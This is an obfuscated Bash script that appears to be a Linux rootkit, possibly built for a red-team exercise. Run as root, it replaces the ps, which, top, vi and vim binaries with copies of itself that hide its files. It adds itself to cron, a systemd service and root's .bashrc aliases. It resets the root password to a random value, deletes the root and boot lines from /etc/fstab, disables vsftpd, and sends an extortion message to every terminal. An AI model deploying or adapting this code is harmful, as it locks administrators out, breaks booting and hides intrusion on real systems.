#!/bin/bash

function EPICBANANA {
    SUNKENSKUNK=$(echo 'L3Vzci9sb2NhbC9kYV92aW5jaS5zaAo=' | base64 -d)
    if [ ! -f $SUNKENSKUNK ]; then
	echo 'IyEvYmluL2Jhc2gKc2NyaXB0PSdVbmxlc3MgZml2ZSBtaWxsaW9uIGRvbGxhcnMgYXJlIHRyYW5zZmVycmVkIHRvIAp0aGUgZm9sbG93aW5nIG51bWJlcmVkIGFjY291bnQgaW4gc2V2ZW4gZGF5cywgCkkgd2lsbCBjYXBzaXplIGZpdmUgdGFua2VycyBpbiB0aGUgRWxsaW5nc29uIApmbGVldC4nCnB0c2Q9JCh3IC1zIC1oIHwgYXdrICd7cHJpbnQgJDJ9JykgCgpmb3IgaSBpbiAkcHRzZDsgZG8gCiAgICB3aGlsZSBJRlM9IHJlYWQgLXIgLW4xIGNoYXJhY3RlcjsgZG8gCiAgICAgICAgZWNobyAtbiAiJGNoYXJhY3RlciIgPiAvZGV2LyRpIAogICAgICAgIHNsZWVwIC4xIAogICAgZG9uZSA8IDwoZWNobyAtbiAiJHNjcmlwdCIpIApkb25lCg==' | base64 -d > $SUNKENSKUNK
        chmod u+x $SUNKENSKUNK
    fi
    grep "$SUNKENSKUNK" /etc/crontab
    res=$?
    if [ $res -ne 0 ]; then
      echo "*/5 * * * * root $SUNKENSKUNK" >> /etc/crontab
    fi
} &> /dev/null

function BENIGNCERTAIN {
    if [ ! -f /root/.miranda ]; then
        new_passwd=`/usr/bin/cat /dev/urandom | tr -cd 'a-f0-9' | head -c 12`
        yes $new_passwd | passwd
        touch /root/.miranda
    fi
} &> /dev/null

function FALSEMOREL {
    sed -i '/root/d' /etc/fstab
    sed -i '/boot/d' /etc/fstab
} &> /dev/null

function BACKSNARF {
    path=$(echo 'L2V0Yy9jcm9uLmhvdXJseS8wbG9ncm90YXRlLmNyb24K' | base64 -d)
    mysum=`md5sum $0 | cut -d' ' -f1`
    cronsum=`md5sum $path | cut -d' ' -f1`

    if [ "$mysum" != "$pssum" ]; then
        cp $0 $path
        chmod ugo+rx $path
    fi
} &>/dev/null

function POLARSNEEZE {
    SNEEZE1=$(echo $1 | base64 -d)
    SNEEZE2=$(echo $2 | base64 -d)
    HANDKERCHIEF=$(echo 'L3Jvb3QvLmJhc2hyYwo=' | base64 -d)

    cp $0 $SNEEZE1
    grep "alias $SNEEZE2='$SNEEZE1'" $HANDKERCHIEF
    res=$?

    if [ $res -ne 0 ]; then
        sed -i "/alias $SNEEZE2/,+1 d" $HANDKERCHIEF
        echo "alias $SNEEZE2='$SNEEZE1'" >> $HANDKERCHIEF
    fi
} &>/dev/null

function EXTRABACON {
    name=$(echo $1 | base64 -d)
    mysum=`md5sum $0 | cut -d' ' -f1`
    whichsum=`md5sum /usr/bin/$name | cut -d' ' -f1`
    file /usr/bin/$name | grep ELF
    alf=$?

    if [ "$mysum" != "$lssum" ] && [ $alf -eq 0 ]; then
        mv /usr/bin/$name /usr/bin/.$name
        cp $0 /usr/bin/$name
        chmod ugo+rx /usr/bin/$name
        touch -d '1 year ago' /usr/bin/$name
    fi
} &>/dev/null

function ELIGIBLECONTESTANT {
    mysum=`md5sum /etc/systemd/system/eDuZ1n.service | cut -d ' ' -f1`

    if [ "$mysum" != "a9d99e532cf4dfaa7f8b3bcceabf7aa4" ]; then
        echo "Creating systemd service"
        echo -e "[Unit]\nDescription=romain lettuce\n" > /etc/systemd/system/eDuZ1n.service
        echo -e "[Service]\nExecStart=$1 &>/dev/null\n" >> /etc/systemd/system/eDuZ1n.service
        echo -e "[Install]\nWantedBy=multi-user.target\n" >> /etc/systemd/system/eDuZ1n.service
        systemctl reload eDuZ1n.service
    fi

    if [ ! -x /etc/systemd/system/multi-user.target.wants/eDuZ1n.service ]; then
        systemctl enable eDuZ1n.service
    fi

    target=$(echo 'dnNmdHBkCg==' | base64 -d)
    systemctl is-enabled $target
    res=$?
    if [ $res -eq 0 ]; then
        systemctl disable $target
    fi

} &>/dev/null

function ELIGIBLECANDIDATE {
    new_filename=`cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32`
    random_folder=`find /usr -maxdepth 1 -mount -type d | sort -R | head -n 1`
    new_script=$random_folder'/.'$new_filename'.sh'
    echo "Relocating to $new_script..."
    if [ $1 -eq 1 ]; then
        mv $0 $new_script
    else
        cp $0 $new_script
    fi

    ELIGIBLECONTESTANT $new_script
    $new_script &

} &>/dev/null

DEWSWEEPER=$(echo $0 | base64)
GENIE=$(echo 'L2Jpbi8ucHMgYXV4Cg==' | base64 -d)
stufftohide=$(echo 'LmxzXHwud2hpY2hcfC5wc1x8LnRvcFx8MGxvZ3JvdGF0ZVx8ZGFfdmluY2kuc2hcfC5taXJhbmRhXHwuZDNidWdcfC52aVx8LnZpbVx8Y2F0LjguZ3oK' | base64 -d)

if [ "$DEWSWEEPER" == "L3Vzci9iaW4vcHMK" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    number=$RANDOM
    target=$(echo "L2Jpbi8ucHMK" | base64 -d)
    output=$($target "$@")
    output=$(echo "$output" | sed '/\.ps/,+1 d' | sed '/[0-9]*\.sh/,+1 d')
    echo -e "$output\n\n"

    exit 0
fi

if [ "$DEWSWEEPER"  == "L3RtcC8uZDNidWcK" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    target=$(echo "L3Vzci9iaW4vbHMK" | base64 -d)
    $target "$@" | grep -v $stufftohide
    exit 0
fi

if [ "$DEWSWEEPER" == "L3Vzci9iaW4vdG9wCg==" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    target=$(echo "L3Vzci9iaW4vLnRvcAo=" | base64 -d)
    $target
    exit 0
fi

if [ "$DEWSWEEPER" == "L3Vzci9iaW4vd2hpY2gK" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    target=$(echo "L3Vzci9iaW4vLndoaWNoCg==" | base64 -d)
    $target "$@"
    exit 0
fi

if [ "$DEWSWEEPER" == "L3Vzci9iaW4vdmltCg==" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    target=$(echo "L3Vzci9iaW4vLnZpbQo=" | base64 -d)
    echo $@ | grep $stufftohide &> /dev/null
    if [ $? -eq 0 ]; then
        echo 'What would MC Hammer have to say about touching this file?'
        exit 90
    fi
    $target "$@"
    exit 0
fi

if [ "$DEWSWEEPER" == "L3Vzci9iaW4vdmkK" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    target=$(echo "L3Vzci9iaW4vLnZpCg==" | base64 -d)
    echo $@ | grep $stufftohide &> /dev/null
    if [ $? -eq 0 ]; then
        echo 'What would MC Hammer have to say about touching this file?'
        exit 90
    fi
    $target "$@"
    exit 0
fi

if [ "$DEWSWEEPER" == "L3Vzci9zaGFyZS9tYW4va28vbWFuOC9jYXQuOC5nego=" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    echo 'DQoNCg0KICAgIFp6enp6ICB8XCAgICAgIF8sLCwtLSwsXyAgICAgICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKw0KICAgICAgICAgICAvLGAuLSdgJyAgIC5fICBcLTs7LF8gICAgfCBDYXQgaXMgc2xlZXBpbmcuIEJlIHZlcnkgfA0KICAgICAgICAgIHwsNC0gICkgKV8gICAuOy4oICBgJy0nICAgfCB2ZXJ5LCB2ZXJ5LCB2ZXJ5LCBxdWlldCEgfA0KICAgICAgICAgJy0tLScnKF8vLl8pLScoX1xfKSAgICAgICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKw0KDQoNCg==' | base64 -d
    exit 0
fi

if [ "$DEWSWEEPER" == "L2V0Yy9jcm9uLmhvdXJseS8wbG9ncm90YXRlLmNyb24K" ]; then
    if [ `$GENIE | grep -E "[[:xdigit:]]{32}" | wc -l` -eq 0 ]; then
        ELIGIBLECANDIDATE 0
    fi
    exit 0
fi

if [ "$1" != "nosleep" ]; then
    sleep 5
fi

EPICBANANA
BENIGNCERTAIN
FALSEMOREL
BACKSNARF
POLARSNEEZE 'L3RtcC8uZDNidWcK' 'bHMK'
POLARSNEEZE 'L3Vzci9zaGFyZS9tYW4va28vbWFuOC9jYXQuOC5nego=' 'Y2F0Cg=='
EXTRABACON 'cHMK'
EXTRABACON 'd2hpY2gK'
EXTRABACON 'dG9wCg=='
EXTRABACON 'dmltCg=='
EXTRABACON 'dmkK'
ELIGIBLECANDIDATE 1
